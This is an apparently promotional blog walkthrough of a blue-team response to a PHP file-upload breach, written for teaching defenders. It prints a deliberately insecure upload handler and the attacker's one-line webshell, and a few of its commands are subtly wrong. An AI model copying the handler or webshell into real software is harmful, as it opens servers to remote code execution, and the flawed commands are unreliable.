# How a Blue Team Saved a Company in 3 Hours: A Step-by-Step Real Incident Guide

**Published:** 2025-11-12


**✨ Link for the full article in the first comment**

Late one Tuesday afternoon, the call came in: “We’re seeing weird traffic. Is this normal?” Within three hours, a lean but battle-hardened blue team took the company from open wound to absolute control. Sound like a Netflix thriller? Nope — it’s real life in cybersecurity, where minutes matter and mistakes get expensive. The cool part? You don’t need magic tools or a PhD — just sharp skills, fast thinking, and rock-solid teamwork.

Let’s pull back the curtain and walk through exactly **how** a blue team saved a company from disaster in under three hours. You’ll see the gritty reality: frantic log dives, Python scripts, packet captures, the works. Along the way, you’ll pick up hands-on techniques you can use on your own blue team, whether you’re defending a Fortune 500 or your cousin’s online shop.

If you’ve ever wondered, “What do incident responders **actually** do when everything hits the fan?”, this is for you.

### The Setup: What Happened, and Why It Matters

You might think: “Incidents always start with alarms blaring and dashboards lighting up, right?” Actually, most real breaches start with something subtle: someone notices a blip, a weird login, a server acting cranky. In this case, it was a sudden spike in outbound traffic from a database server — nothing showy, just enough to make an experienced sysadmin squint.

### The Environment

*   **Company size:** ~200 employees, mixed on-prem/cloud stack
*   **Critical assets: Customer database (Postgres), web app, internal Git repos**
*   **Security posture:** Decent—MFA, segmented VLANs, but some legacy code and not every log flowing to SIEM
*   **Attack surface:** Exposed web app (legacy PHP), VPN, Office365, a few shadow IT boxes

Right away, the blue team suspected either data exfiltration or command-and-control (C2) traffic. RCE, SQLi, XSS, privilege escalation — all were on the table. Time to move.

### Step 1: Initial Triage — The “Oh Crap” 15 Minutes

First moves are everything. Get the basics wrong, and you’re chasing ghosts for hours. Get them right, and you’re already ahead of the attacker.

### Triage Checklist

*   **Who**’s seeing what?
*   **What**’s the scope?
*   **Has anything changed in the last hour?**
*   **Where**’s the weird traffic headed?

The blue team fired up their chat war room (Mattermost, but Slack/Discord works too), assigned roles **instantly**, and hit the ground running.

### Quick Recon: Traffic Analysis

One analyst pulled up the firewall logs and ran a quick filter:

grep "db-server" /var/log/firewall.log | grep "DENY"

Hmm. A bunch of denied outbound connections to random IPs in Romania and Russia. Not great.

Another teammate started a live `tcpdump` to get more detail:

tcpdump -i eth0 host db-server and port 443 -w suspicious-traffic.pcap

Now, they had packet captures in case things got ugly.

### The Surprising Stat

Most breaches aren’t detected for **over 200 days**, but this team caught it in **minutes** because they noticed a small anomaly. It’s almost always a hunch, not a blinking red light.

### Step 2: Containment Without Panic

Here’s where a lot of companies fumble. Should you yank the Ethernet cable? Nuke the server from orbit? In practice, what really happens is — you **contain** smartly, so you don’t tip off the attacker or kill the evidence.

### What They Did

*   **Isolate the server — but** logically **via firewall rules, not physically (yet)**
*   **Snapshot everything:** memory, disk, running procs
*   **Preserve logs:** Copy SIEM data and local logs off-server

A quick, controlled containment script:

\# Block all outbound except internal monitoring and incident response IPs  
iptables -A OUTPUT -d ! 10.0.0.0/8 -j DROP  
\# Take a memory dump (Linux, as root)  
gcore -o /tmp/db-server-core \`pidof postgres\`

You don’t want to break the connection so hard that the attacker freaks out and nukes logs or triggers ransomware. Controlled response is the name of the game.

### Maintaining Stealth

They avoided rash moves: no “kill -9”, no sudden shutdown. Instead, the logs kept rolling in, and the blue team could watch what the attacker did next. Sometimes, patience is the sharpest weapon you have.

### Step 3: Rapid Forensics — Find the Entry Point

Here’s where things get technical. The team needed to figure out **how** the attacker got in. Was it a known CVE? Zero-day? Or (as so often) a simple password reuse?

### Step-by-Step Log Dive

They started with the web server logs. Something didn’t add up — POST requests to `/admin/upload.php`, but this wasn’t a public endpoint.

A quick search:

grep -i "POST" /var/log/nginx/access.log | grep "/admin/upload.php"

Boom: a flood of requests with a suspicious User-Agent string:

Mozilla/5.0 (compatible; sqlmap/1.4.10#stable)

Ah, sqlmap — classic automated SQL injection tool. That’s a **big** clue.

### Code Inspection: The Vulnerable Endpoint

The team pulled up the legacy PHP file. I’ve seen this trick in real pentests before.

php  
<?php  
if(isset($\_POST\['file'\])){  
$name = $\_POST\['name'\];  
$file = $\_POST\['file'\];  
// Oops, no sanitization!  
file\_put\_contents("/var/www/uploads/$name", $file);  
}  
?>

No sanitization, no authentication. Anyone could POST arbitrary files and name them whatever they wanted. You can probably see where this is going…

### Confirming the Exploit

They checked the `/uploads/` directory:

ls -l /var/www/uploads/

Among the legit files was `shell.php`. Classic webshell. They opened it (carefully):

php  
<?php system($\_GET\['cmd'\]); ?>

So, RCE (Remote Code Execution) via webshell, thanks to unauthenticated file upload. Simple, dangerous, and effective.

### Step 4: Scoping the Damage — What Did They Touch?

Knowing how the attacker got in is one thing. You also need to know **what** they did next. Did they escalate? Dump the database? Install more backdoors?

### Database Logs and Privilege Escalation

The team checked Postgres logs for unusual queries:

cat /var/log/postgresql/postgresql-13-main.log | grep "COPY"

There it was — export commands dumping customer tables to `/tmp/dump.csv`, and then uploads out via HTTP POSTs. The attacker **definitely** got data out.

They also checked for privilege escalation attempts:

cat /var/log/auth.log | grep "sudo"

A few failed sudo attempts from the `www-data` user, but nothing successful. So, the attacker stayed as the web server user.

### Lateral Movement Checks

Next, the team searched for SSH activity:

last | grep "pts"

No suspicious logins. They scanned for SSH keys dropped in `~/.ssh/authorized_keys` and found none.

This attacker was “smash and grab” — get in, exfiltrate, get out. Sometimes, that’s all it takes.

### Step 5: Eradication — Kick Them Out (And Keep Them Out)

With the entry point and scope defined, it was time to **evict** the attacker and patch the hole.

### Hardening the Defenses

**Immediate fixes:**

*   Remove `upload.php`, nuke all files in `/uploads/` except known good ones
*   Patch the web app—add authentication and file type checking
*   Rotate all relevant credentials, especially database and server passwords
*   Update firewall rules to block outbound HTTP/HTTPS except for known destinations

**Sample code: basic file type checking in PHP**

php  
$allowed\_types = \['image/jpeg', 'image/png'\];  
if (in\_array($\_FILES\['file'\]\['type'\], $allowed\_types)) {  
move\_uploaded\_file($\_FILES\['file'\]\['tmp\_name'\], "/var/www/uploads/" . basename($\_FILES\['file'\]\['name'\]));  
} else {  
die("Invalid file type.");  
}

Of course, in prod, use a proper framework and never roll your own upload handler.

### Threat Hunting: Double-Checking for Persistence

Even after you **think** you’ve fixed it, attackers love to hide persistence mechanisms. The team ran a basic persistence check:

\# Look for suspicious cron jobs  
crontab -l  
grep -r "curl" /etc/cron.\*  
\# Search for rogue startup scripts  
find /etc/init.d -type f | xargs grep "wget"

Nothing found — lucky this time. But they also scanned for hidden files and backdoors:

find /var/www/ -type f -name ".\*.php"

Clean.

### System Restore & Monitoring

They restored the server from a clean backup **before** the initial compromise (based on timestamped logs), and kept the old image for forensics.

Monitoring was cranked up to 11:

*   IDS (Snort) rules updated for webshell signatures
*   SIEM alert rules for abnormal outbound traffic
*   Web app logs shipped in real time to the IR channel

### Step 6: Post-Incident Lessons and Blue Team Wisdom

Let’s be real: no incident response is perfect. It’s messy, stressful, and things always slip through the cracks. But here’s what set this team apart.

### What Worked

*   **Rapid detection:** Human intuition matters. A weird spike in traffic, not an alert, saved the day.
*   **Clear roles:** No one micromanaged; everyone knew their specialty and acted fast.
*   **Evidence preservation:** They kept logs, memory dumps, and forensics images before wiping or patching anything.

### What Could Improve

*   **Automated alerts:** Next time, anomaly-based detection could flag weird outbound patterns earlier.
*   **Web app pentesting:** Regular bug bounty or internal pentesting might have found the upload vulnerability.
*   **Security testing in CI/CD:** Even legacy PHP can be scanned with open-source tools.

### Step 7: Tools and Scripts the Blue Team Used

You don’t need a $100k SIEM or a fleet of security engineers. Here’s what actually got used — nothing fancy, but all effective.

### Core Tools

*   **grep, awk, less:** For ripping through logs at warp speed
*   **tcpdump, Wireshark:** Packet capture, protocol analysis
*   **gcore, dd:** Fast memory and disk snapshots
*   **iptables:** Quick containment, blocking outbound traffic
*   **Open Source SIEM (Graylog/ELK):** For central log monitoring

### Sample Bash Script: Quick Triage

This is a quick triage script you can copy for your own blue team:

#!/bin/bash  
\# Quick IR triage  
echo "\[\*\] Recent logins:"  
last -a | head -n 10  
echo "\[\*\] Suspicious running processes:"  
ps aux | grep -v root | grep -v postgres  
echo "\[\*\] Recent changes in web directory:"  
find /var/www/ -type f -mtime -1  
echo "\[\*\] Outbound network connections:"  
netstat -antp | grep ESTABLISHED | grep -v 127.0.0.1

Drop this on a box and you’ve got answers in seconds.

### Step 8: Communication — Keeping the Company Calm (and Legal)

It’s not just about fixing the tech. It’s about telling the right people the right thing at the right time. The blue team looped in management with **just enough** detail — no jargon.

*   “We found a web vulnerability. Data may have leaked. It’s contained.”
*   “Next steps: Notify affected users, review compliance obligations, do a full security review.”

They kept legal and PR in the loop, but didn’t waste time on endless meetings. Action beats analysis paralysis every single time.

### Step 9: Building Resilience — Preventing the Next Attack

After the dust settled, the real work began: making sure this never happens again.

### Hardening Lessons

*   **Web app firewall (WAF):** Deployed ModSecurity with custom rules to block upload exploits and SQLi.
*   **Regular bug bounty program:** Even paying $200/bug is cheaper than a breach.
*   **Automated dependency scanning:** Tools like Snyk or Trivy to catch vulnerable packages.
*   **Least privilege:** Database user only allowed SELECT, INSERT—not COPY or DROP TABLE.

### Continuous Red Team Drills

You can’t get complacent. The blue team scheduled quarterly red team exercises: real pentesters, real attacks, no warning. The goal? Find gaps before attackers do.

### Final Thoughts: The Real Magic Is in the People

If you take just one thing from this story, let it be this: tools are nice, but **people — curious, fast-thinking, gritty blue teamers** — make the biggest difference. They noticed a blip, trusted their gut, moved fast, and didn’t break things (at least, not more than they had to).

![Image](https://miro.medium.com/v2/resize:fit:700/0*ZrsJWJ7feJrX9tm8)

*Photo by thisGUYshoots on Unsplash*

Three hours after that first call, the company was safer than it had been in years. They didn’t just clean up — they leveled up.

And you can, too. Practice your log diving. Hack your own apps. Learn to triage on the fly. The next time **your** team gets that call, you’ll know exactly what to do.

Stay sharp, and don’t wait for the sirens to start. Sometimes, it’s the quietest alerts that matter most.

### 🚀 Become a VeryLazyTech Member — Get Instant Access

What you get today:

✅ **70GB Google Drive** packed with cybersecurity content

✅ **3 full courses** to level up fast

👉 **Join the Membership** → [https://whop.com/verylazytech/](https://whop.com/verylazytech/)

### 📚 Need Specific Resources?

✅ Instantly download the **best hacking guides, OSCP prep kits, cheat sheets, and scripts** used by real security pros.

👉 **Visit the Shop** → [https://whop.com/verylazytech/](https://whop.com/verylazytech/)

### 💬 Stay in the Loop

Want quick tips, free tools, and sneak peeks?

✖ [Twitter](https://x.com/verylazytech/) | 👾 [GitHub](https://github.com/verylazytech/) | 📺 [YouTube](https://youtube.com/@verylazytech/) | 📩 [Telegram](https://t.me/+mSGyb008VL40MmVk/) | 🕵️‍♂️ [Website](https://www.verylazytech.com/)